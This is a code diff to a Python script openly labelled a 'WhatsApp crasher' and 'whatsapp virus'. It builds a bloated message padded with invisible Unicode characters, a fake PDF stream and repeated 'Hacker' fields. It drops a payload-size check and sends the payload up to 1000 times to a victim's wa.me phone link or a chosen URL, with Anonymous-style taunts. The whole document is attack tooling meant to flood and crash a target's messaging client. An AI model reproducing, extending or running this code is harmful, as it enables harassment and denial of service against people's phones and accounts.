@@ -1,5 +1,5 @@
 
-import os, sys, time, threading
+import os, sys, time, urllib
 from socket import *
 import phonenumbers
 import requests
@@ -48,8 +48,7 @@ def banner():
 ===========================================================""")
 
 
-def set_malicious_payload():
-    user = input("[+] Enter message to send: ")
+def set_malicious_payload(user):
     user_payload = f"‎‏\n\tattacker's message: {user}\n\t‎‏\n\tattacke's ip: {ipaddr}\n\twhatsapp crasher, created by ëvĩʟ-fɘōɳĭx 😈☠😈" if user else ""
 
     data = {
@@ -143,6 +142,15 @@ def set_malicious_payload():
     /ColorTransform 0
     /Length 3311
     >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
+    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
+    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
+    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
+    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
+    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
+    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
+    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
+    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
+    >>‎‏    ëvĩʟ-fɘōɳĭx 😈☠😈
     >>    https://www.evilfeonix.com      <<
             www.evilfeonix@gmail.com  
         """
@@ -152,8 +160,35 @@ def set_malicious_payload():
     max_data_size = max_data
     data_size = len(json.dumps(data).encode("utf-8"))
     
-    if not data_size > max_data_size:
-        data["Hacker"] = f"""  attacker's ip: {ipaddr}...
+    data["Hacker"] = f"""  attacker's ip: {ipaddr}...
+    ======================================================================================
+            ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
+        ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
+        ‎‏ >> https://github.com/evilfeonix/Whats-Crasher << ‎‏ 
+        ‎‏ >> Whats-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
+    ======================================================================================"""
+    data["Hacker1"] = f"""  attacker's ip: {ipaddr}...
+    ======================================================================================
+            ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
+        ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
+        ‎‏ >> https://github.com/evilfeonix/Whats-Crasher << ‎‏ 
+        ‎‏ >> Whats-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
+    ======================================================================================"""
+    data["Hacker2"] = f"""  attacker's ip: {ipaddr}...
+    ======================================================================================
+            ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
+        ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
+        ‎‏ >> https://github.com/evilfeonix/Whats-Crasher << ‎‏ 
+        ‎‏ >> Whats-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
+    ======================================================================================"""
+    data["Hacker3"] = f"""  attacker's ip: {ipaddr}...   
+    ======================================================================================
+            ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
+        ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
+        ‎‏ >> https://github.com/evilfeonix/Whats-Crasher << ‎‏ 
+        ‎‏ >> Whats-Crasher by ëvĩʟ-fɘōɳĭx hacker 😈☠😈 << ‎‏ 
+    ======================================================================================"""
+    data["Hacker4"] = f"""  attacker's ip: {ipaddr}...
     ======================================================================================
             ‎‏         >> ëvĩʟ-fɘōɳĭx 😈☠😈  <<      ‎‏ 
         ‎‏      >> whatsapp virus by ëvĩʟ-fɘōɳĭx  <<      ‎‏
@@ -164,26 +199,80 @@ def set_malicious_payload():
     return data
 
 
-def start_attack(i,j,k,victim):
-    worm = set_malicious_payload()
+def start_attack(msg,victim):
+    payload = set_malicious_payload(msg)
+
+    worm = {"text":json.dumps(payload),"data":json.dumps(payload)}
 
     if victim[0] == '+':
-        url = "https://web.whatsapp.com/send"
-        payload_container = {"phone": victim,"text": json.dumps(worm)}
+        data = urllib.parse.urlencode(worm)
+        url = f"https://wa.me/{victim}?{data}"
 
     else:
-        url = victim
-        payload_container = {"text": json.dumps(worm),"data": json.dumps(worm)}
+        data = urllib.parse.urlencode(worm)
+        url = f"{victim}?{data}"
     
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.3","Content-Type": "application/json"}
     
-    try:response = requests.post(url, headers=headers, json=payload_container)
+    try:response = requests.get(url)
     except requests.exceptions.ConnectionError:
-        slow("[-] Please Check Your Internet Connection.")
+        slow(f"{red}[-] Please Check Your Internet Connection.{white}")
         os.sys.exit()
 
     if response.status_code == 200:
         os.system("clear || cls")
+        return True
+    else:
+        return False
+        
+        
+
+def multipro(victim):
+    i=0
+    j=0
+    msg = input("[+] Enter message to send: ")
+    try:
+        for k in range(1000):
+            a = start_attack(msg,victim)
+            if a == True:
+                i+=1
+                print(f"{bg}{red}Press Ctr+C to stop Attacks\033[0m{red}",end='\r')
+            else:
+                j+=1
+
+    except KeyboardInterrupt:
+        slow(f"{red}[-] Attack Stopped!{white}              ")
+        time.sleep(3)
+
+    os.system('clear || cls')
+    slow(f"""{red}
+ _      _  _           _           ____               _     
+| |    | || |__   __ _| |_ ___    / ___|_ __ __ _ ___| |__  
+| | /\ | || '_ \ / _` | __/ __|  | |   | '__/ _` / __| '_ \ 
+| |/  \| || | | | (_| | |_\__ \  | |___| | | (_| \__ \ | | |
+\___/\___/|_| |_|\__,_|\__|___/   \____|_|  \__,_|___/_| |_|
+===========================================================
+    HAHAHA!. 💀☠💀               
+    we are 🎭 anonymous 🤬,   
+    we do not forgive 👿,  
+    we do not forget 😈,
+    expect us 👥 any time 👀.{red}
+===========================================================
+    Status: OK        
+    Status_Code: 200        
+    Victim: {victim}        
+    Sent: {i}        
+    Failed: {j}        
+        {bg}{red}Press Ctr+C to stop Attacks\033[0m{red}
+==========================================================={white}
+            """)
+def pro(victim):
+    i=0
+    j=0
+    k=0
+    msg = input("[+] Enter message to send: ")
+    a = start_attack(msg,victim)
+    if a == True:
+        i+=1
         slow(f"""{red}
  _      _  _           _           ____               _     
 | |    | || |__   __ _| |_ ___    / ___|_ __ __ _ ___| |__  
@@ -199,57 +288,14 @@ def start_attack(i,j,k,victim):
 ===========================================================
     Status: OK        
     Status_Code: 200        
-    Server: {url}        
-    Sent: {i+1}        
+    Victim: {victim}        
+    Sent: {i}        
     Failed: {j}        
         {bg}{red}Press Ctr+C to stop Attacks\033[0m{red}
 ==========================================================={white}
-        """)
-
-    elif response.status_code == 400:
-        os.system("clear || cls")
-        slow(f"""{red}
- _      _  _           _           ____               _     
-| |    | || |__   __ _| |_ ___    / ___|_ __ __ _ ___| |__  
-| | /\ | || '_ \ / _` | __/ __|  | |   | '__/ _` / __| '_ \ 
-| |/  \| || | | | (_| | |_\__ \  | |___| | | (_| \__ \ | | |
-\___/\___/|_| |_|\__,_|\__|___/   \____|_|  \__,_|___/_| |_|
-===========================================================
-    HAHAHA!. 💀☠💀               
-    we are 🎭 anonymous 🤬,   
-    we do not forgive 👿,  
-    we do not forget 😈,
-    expect us 👥 any time 👀.{red}
-===========================================================
-    Status: Error        
-    Status_Code: 400     
-    Server: {url}        
-    Message: <h1>Sorry, something went wrong.</h1>  
-             <p>We're working on getting this fixed as soon as we can.</p>{red}        
-==========================================================={white}
-        """)
-        os.sys.exit()
-
+            """)
     else:
-        j+1
-        
-        
-
-def multipro(victim):
-    i=0
-    j=0
-    try:
-        for k in range(500):
-            t = threading.Thread(target=start_attack, args=(i,j,k,victim))
-            t.start()
-    except KeyboardInterrupt:
-        slow("[-] Attack Stopped!")
-
-def pro(victim):
-    i=0
-    j=0
-    k=0
-    start_attack(i,j,k,victim)
+            j+=1
     
     
 def main():
